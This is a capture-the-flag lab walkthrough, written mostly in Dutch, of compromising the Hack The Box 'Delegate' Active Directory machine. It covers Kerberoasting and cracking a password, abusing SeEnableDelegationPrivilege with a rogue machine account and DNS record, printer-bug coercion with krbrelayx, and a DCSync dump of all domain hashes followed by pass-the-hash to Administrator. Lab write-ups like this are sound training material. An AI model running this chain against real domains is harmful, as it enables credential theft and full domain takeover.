# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Delegate]
└─$ nmap 10.129.38.251    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 16:59 CET
Nmap scan report for 10.129.38.251
Host is up (0.42s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/Delegate]
└─$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 -sCV 10.129.38.251
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 17:02 CET
Nmap scan report for 10.129.38.251
Host is up (0.35s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-12 16:02:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-12T16:03:49+00:00; +2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-12T16:03:08+00:00
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2026-01-11T15:58:23
|_Not valid after:  2026-07-13T15:58:23
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=1/12%Time=69651B33%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2026-01-12T16:03:10
|_  start_date: N/A

```

This box is not exposing a lot. I can see that the SMB server port is open but when we did not get any user credentials. I tried to check with anonymous user and there i cannot see any special other drive that is shared with this user. 

```
┌──(kali㉿kali)-[~/HTB/Delegate]
└─$ smbmap -H 10.129.38.251 -u guest
                 
[+] IP: 10.129.38.251:445       Name: delegate.vl               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[-] Closing connections..                                                                                          [*] Closed 1 connections    
```

By checking each drive i did found a users.bat file. I downloaded this file to my own machine and there i did find some interesting information.

```
┌──(kali㉿kali)-[~/HTB/Delegate]
└─$ smbclient \\\\10.129.38.251\\netlogon -U anonymous
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 26 14:45:24 2023
  ..                                  D        0  Sat Aug 26 11:45:45 2023
  users.bat                           A      159  Sat Aug 26 14:54:29 2023

                4652287 blocks of size 4096. 1120368 blocks available
smb: \> get users.bat 
getting file \users.bat of size 159 as users.bat (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

Within the users.bat file was write the following information.

```
┌──(kali㉿kali)-[~/HTB/Delegate]
└─$ cat users.bat  
rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123  
```

Here we can see some interessting information. We kunnen zien dat er een user A.Briggs noemt en we kunnen op het einde van de file een password zien. Ik ben als eerst nu op de rpcclient gaan kijken of ik aan de hand van het queryuser commando geen interessante informatie kon vinden. Bijvoorbeeld als een user zijn password in de description gezet had konden we het met dat commando vinden, maar zoals je zelf zult kunnen zien is dit een doodlopend spoor.

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[A.Briggs] rid:[0x450]
user:[b.Brown] rid:[0x451]
user:[R.Cooper] rid:[0x452]
user:[J.Roberts] rid:[0x453]
user:[N.Thompson] rid:[0x454]

rpcclient $> queryuser N.Thompson
```

Ik ben de users in een bestand gaan zetten en ben eens gaan kijken of ik het wachtwoord nog voor andere users kan gebruiken maar dit ook zonder success.

```
┌──(kali㉿kali)-[~/HTB/Delegate]
└─$ netexec ldap delegate.vl -u 'users.txt' -p 'P4ssw0rd1#123' --continue-on-success 
LDAP        10.129.38.251   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
LDAP        10.129.38.251   389    DC1              [-] delegate.vl\Administrator:P4ssw0rd1#123 
LDAP        10.129.38.251   389    DC1              [-] delegate.vl\Guest:P4ssw0rd1#123 
LDAP        10.129.38.251   389    DC1              [-] delegate.vl\krbtgt:P4ssw0rd1#123 
**LDAP        10.129.38.251   389    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123** 
LDAP        10.129.38.251   389    DC1              [-] delegate.vl\b.Brown:P4ssw0rd1#123 
LDAP        10.129.38.251   389    DC1              [-] delegate.vl\R.Cooper:P4ssw0rd1#123 
LDAP        10.129.38.251   389    DC1              [-] delegate.vl\J.Roberts:P4ssw0rd1#123 
LDAP        10.129.38.251   389    DC1              [-] delegate.vl\N.Thompson:P4ssw0rd1#123 
```

Zoals je hierboven kunt zien kan ik wel de gegevens van de ldap server halen. Ik ben dus de gegevens van de ldap server gaan halen. Ik zal deze gaan uploaden in bloodhound voor het zien naar andere informatie.

```
┌──(kali㉿kali)-[~/HTB/Delegate]
└─$ nxc ldap 10.129.38.251 -u 'A.Briggs' -p 'P4ssw0rd1#123' --bloodhound --collection All --dns-server 10.129.38.251
LDAP        10.129.38.251   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
LDAP        10.129.38.251   389    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123 
LDAP        10.129.38.251   389    DC1              Resolved collection methods: acl, psremote, trusts, group, container, rdp, session, objectprops, dcom, localadmin
LDAP        10.129.38.251   389    DC1              Done in 00M 20S
LDAP        10.129.38.251   389    DC1              Compressing output into /home/kali/.nxc/logs/DC1_10.129.38.251_2026-01-12_173446_bloodhound.zip
```

Ik ben de data gaan uploaden in bloodhound en daar heb ik gezien met de credentials die ik gevonden heb, heb ik write rechten op de user N.Thompson.

![[Pasted image 20260112180502.png]]

Ik ben door gebruik te maken van de targetedKerberoast.py tool de NTLM hash gaan verkrijgen van de N.Thompson user. 

```
┌──(kali㉿kali)-[~/HTB/Delegate]
└─$ python3 targetedKerberoast.py -u 'A.Briggs' -p 'P4ssw0rd1#123' -d delegate.vl                         
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$9033cb85ef33d473d18cfcc77415556d$17c834f2a436d960b9393a2d0cb1c768dca12390f4b2c4b77b15fba23479fc5df3f378abd7c6acf2c91cbeaa04f768a9fbc9b0ab1bbb6beeb43e2a16089c2f31af0fce7a1fe69d190d1fa340dc4451ee9719fa357e79409a30f050a4e7224bc3172b5bde90bba444a25b8738c8d49a0129482946f65a68e55dec091fe436dad9cbd2bc3f3c3c53d786b431613e94318de0e928ac8fc4eb7750158947fb0b1b8dc13636d38a5963352f6a3de235a9bffb1224d355825627ccab94dd42e34906cafe5373bf81b51bc3078ab71f510d47578f7610eeb642b9bc251e501f94fe70070e8030d9fae6da375ed19e5c723714b173d65c7c37b00835bfcfef23d588f6d2b01de6f948b191c27dfea5501f3f929c7770886886b9579e94ca820c0c277f835d82a91aadc8007bf6ebc2efcc2a2b72509b12292432d3ee8e2f90c6928f088164be00f3385721e0059552cfa828793ac8e0dd9b1999baf50404325f57dd7d5df024a96cbca484dffdc42a08912e62060b01fe834d1b395b8c1fd837ddd7639c091bb83f472b3bf2b3f2b4b4be651d46ac0fdace7d2674a9ced0709396241cc6f5cc3386a40dab47051d37290b43ceef8d983e92b5bddb5b9f598d10e53b3dfad2fdcc89689a4804e326657759e345cf4a532e5929d77d85065f831a9f52eb8785b62f80315fdf20a0c5b028dc649c9bff33eeeeae86d963bd458d689066d4b9da912f14ada3e37077a5903e089924ac88b2df9f329b762f49b52073ea3fe1e554754066a39b54a1b55176c8dd5bb3f7aaa4da18db632a3e4f2c38495000a06209e0e620477f4dc08c593009a4956064af7c7fcedefab1ea68c9b5d17195b4712de4da0489586209412041e92770489a94f503dc92a93273241d5f154f100dbf1bd0ab1085988224a1bf1d443e3f12f15e407097e8000e58777d7a9a952e65fe44408efd4e3535464a0556a438e7f7b77d35eb2a848e39a1d5bd989fa67de576bb3af0b27a0e55115e76f52fd5f48053d227564abf8a360be711687c815e3bd6010a674ce4eb0fa575ffc4a3b7d80279cf1ad2709148ee6b8841e136d0fdf20e8b9412dc7b740f92553a4bd86d581a3bce01486fa9d7de048c9b187ae0ed3d27736231a71510de5ab96da7f75db1088860b83d26c02c201e0a859225688314992a789770b60fd0532968ef31014eb13627a7a183155a0e8bdfebd54d94a819b3e301c4cd6d84221d76edd4d3779ad93afe758fb7fcc943937043818330ab5c2d2cb98b1d889a937921f153832fbb7d669e8f34fe2298f88b9b762dcf906e5d4ccd6b06fe155b5fea4c9f3e0b478dafc8af950a5da4e5e180d5b928db9c53cb7f8ab2290d42ca99196259b02d1b72f21d2f12c1628a1d472cf50c06594a6ded0329f1e6220256fb6ec8cb83e2d55333b17a931bed253f1dea10354f1046b41183a7dc8106
```

Ik zal de bovenstaande hash in een file gaan zetten en zal de file gaan decrypten door gebruik te maken van john. En zoals je hieronder kunt zien heb ik de user credentials van de user N.Thompson gevonden.

| Username   | Password   |
| ---------- | ---------- |
| N.Thompson | KALEB_2341 |
```
┌──(kali㉿kali)-[~/HTB/Delegate]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
KALEB_2341       (?)     
1g 0:00:00:04 DONE (2026-01-12 18:11) 0.2386g/s 2625Kp/s 2625Kc/s 2625KC/s KANECHA1..KALA535
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Zoals je op Bloodhound kunt zien heeft deze user Remote access tot aan de machine. Ik ben dus aan de hand van de tool evil-winrm verbinding gaan maken met de machine.

```
┌──(kali㉿kali)-[~/HTB/Delegate]
└─$ evil-winrm -i delegate.vl -u N.Thompson -p 'KALEB_2341'

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\N.Thompson\Documents>
```

Ik ben dus nu gaan kijken of dat we de user.txt flag konden vinden binnen de Desktop directory, en deze is was dus daar gevonden.

```
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> cat user.txt
e97a83d09ccaac0dd53f903062565ba7
```

Als we gaan kijken welke privileges de user heeft waarmee we zijn ingeloged, kan je zien dat er 1 belangerijke is die kan gebruikt worden voor het abuse en dat ons naar een priv escalation kan leiden. Hier spreek ik over de volgende privilege: 'SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled'

```
*Evil-WinRM* PS C:\temp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled

```

De onderstaande stappen ben ik gaan door mijn opzoek naar SeEnableDelegationPrivilege. Hierbij ben ik op de volgende pagina gekomen.  https://intrusionz3r0.gitbook.io/intrusionz3r0/windows-penetration-testing/abuse-tokens
# SeEnableDelegationPrivilege 
## Windows
### Adding Computer to the domain controller

```
*Evil-WinRM* PS C:\temp> New-MachineAccount -MachineAccount EVIL -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
[+] Machine account EVIL added
```
### Enabling unconstrained delegation 
UserAccountControl Values: https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties

| Property flag             | Value in decimal | Why?                                      |
| ------------------------- | ---------------- | ----------------------------------------- |
| WORKSTATION_TRUST_ACCOUNT | 4096             | Indicate is a machine account (mandatory) |
| TRUSTED_FOR_DELEGATION    | 524288           | Enable Unconstrained Delegation           |
Total: 524288 + 4096 = 528384
```
*Evil-WinRM* PS C:\temp> Set-MachineAccountAttribute -MachineAccount evil -Attribute useraccountcontrol -Value 528384
[+] Machine account evil attribute useraccountcontrol updated
```
### Adding a malicious HTTP SPN

```
*Evil-WinRM* PS C:\temp> Set-MachineAccountAttribute -MachineAccount evil -Attribute ServicePrincipalName -Value HTTP/EVIL.delegate.vl -Append
[+] Machine account evil attribute ServicePrincipalName appended
```
### Checking the configuration applied

```
*Evil-WinRM* PS C:\temp> Get-MachineAccountAttribute -MachineAccount evil -Attribute ServicePrincipalName -Verbose
Verbose: [+] Domain Controller = DC1.delegate.vl
Verbose: [+] Domain = delegate.vl
Verbose: [+] Distinguished Name = CN=evil,CN=Computers,DC=delegate,DC=vl
HTTP/EVIL.delegate.vl
RestrictedKrbHost/EVIL
HOST/EVIL
RestrictedKrbHost/EVIL.delegate.vl
HOST/EVIL.delegate.vl
```
### Adding a malicious DNS 

```
┌──(kali㉿kali)-[~/HTB/Delegate/krbrelayx]
└─$ python3 dnstool.py -u 'delegate.vl\evil$' -p 'Password123' -r evil.delegate.vl -d 10.10.16.154 -a add dc1.delegate.vl -dns-ip 10.129.38.251
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```
### Capturing the NT Hash via unconstrated delegation
#### Running Krbrelayx to capture TGT
Hacking ip= 10.129.38.251

```
┌──(kali㉿kali)-[~/HTB/Delegate/krbrelayx]
└─$ python3 printerbug.py delegate.vl/'EVIL$:Password123'@10.129.38.251 evil.delegate.vl

┌──(kali㉿kali)-[~/HTB/Delegate/krbrelayx]
└─$ python3 krbrelayx.py -hashes :58a478135a93ac3bf058a5ea0e8fdb71
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.10.16.154
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.129.38.251
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
[*] SMBD: Received connection from 10.129.38.251
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.129.38.251
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'

```
### Performing DCSync Attack against domain controller.

```
┌──(kali㉿kali)-[~/HTB/Delegate/krbrelayx]
└─$ KRB5CCNAME='DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache' impacket-secretsdump -k -no-pass dc1.delegate.vl -just-dc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
root$:4601:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
EVIL$:4602:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f877adcb278c4e178c430440573528db38631785a0afe9281d0dbdd10774848c
Administrator:aes128-cts-hmac-sha1-96:3a25aca9a80dfe5f03cd03ea2dcccafe
Administrator:des-cbc-md5:ce257f16ec25e59e
krbtgt:aes256-cts-hmac-sha1-96:8c4fc32299f7a468f8b359f30ecc2b9df5e55b62bec3c4dcf53db2c47d7a8e93
krbtgt:aes128-cts-hmac-sha1-96:c2267dd0a5ddfee9ea02da78fed7ce70
krbtgt:des-cbc-md5:ef491c5b736bd04c
A.Briggs:aes256-cts-hmac-sha1-96:7692e29d289867634fe2c017c6f0a4853c2f7a103742ee6f3b324ef09f2ba1a1
A.Briggs:aes128-cts-hmac-sha1-96:bb0b1ab63210e285d836a29468a14b16
A.Briggs:des-cbc-md5:38da2a92611631d9
b.Brown:aes256-cts-hmac-sha1-96:446117624e527277f0935310dfa3031e8980abf20cddd4a1231ebf03e64fee8d
b.Brown:aes128-cts-hmac-sha1-96:13d1517adfa91fbd3069ed2dff04a41b
b.Brown:des-cbc-md5:ce407ac8d95ee6f2
R.Cooper:aes256-cts-hmac-sha1-96:786bef43f024e846c06ed7870f752ad4f7c23e9fdc21f544048916a621dbceef
R.Cooper:aes128-cts-hmac-sha1-96:8c6da3c96665937b96c7db2fe254e837
R.Cooper:des-cbc-md5:a70e158c75ba4fc1
J.Roberts:aes256-cts-hmac-sha1-96:aac061da82ae9eb2ca5ca5c4dd37b9af948267b1ce816553cbe56de60d2fa32c
J.Roberts:aes128-cts-hmac-sha1-96:fa3ef45e30cf44180b29def0305baeb6
J.Roberts:des-cbc-md5:6858c8d3456451f4
N.Thompson:aes256-cts-hmac-sha1-96:7555e50192c2876247585b1c3d06ba5563026c5f0d4ade2b716741b22714b598
N.Thompson:aes128-cts-hmac-sha1-96:7ad8c208f8ff8ee9f806c657afe81ea2
N.Thompson:des-cbc-md5:7cab43c191a7ecf2
DC1$:aes256-cts-hmac-sha1-96:358880cace9d6c849f2069f2ac7582b18de5185b3c815b6728cb3542c0d25fa1
DC1$:aes128-cts-hmac-sha1-96:f922407dfc023ec95d458257224ce8d9
DC1$:des-cbc-md5:9e16cd46ad54cba7
root$:aes256-cts-hmac-sha1-96:8c2a7b53433e72d6d53c36ddf92c76256065008b7465f4d0a3a86d2b0715b652
root$:aes128-cts-hmac-sha1-96:90c7773f91b4dee758a260ca63f2238d
root$:des-cbc-md5:6b1f1afd3d548338
EVIL$:aes256-cts-hmac-sha1-96:c545c905176a106170b502064c4abb36b7cc384798366cc6ef3366db925ac2e6
EVIL$:aes128-cts-hmac-sha1-96:3d344088c790fe886b1ac870a809ce5b
EVIL$:des-cbc-md5:1a10836b7373733d

```

### Connection to WIN machine with admin

```
┌──(kali㉿kali)-[~/…/Delegate/krbrelayx/pypykatz/pypykatz]
└─$ evil-winrm -i delegate.vl -u administrator -H 'c32198ceab4cc695e65045562aa3ee93'

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

## Rooted

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         1/12/2026   7:59 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
f1ae63e633b6e5689a6c77d86ba3f125

```

![[Pasted image 20260112214026.png]]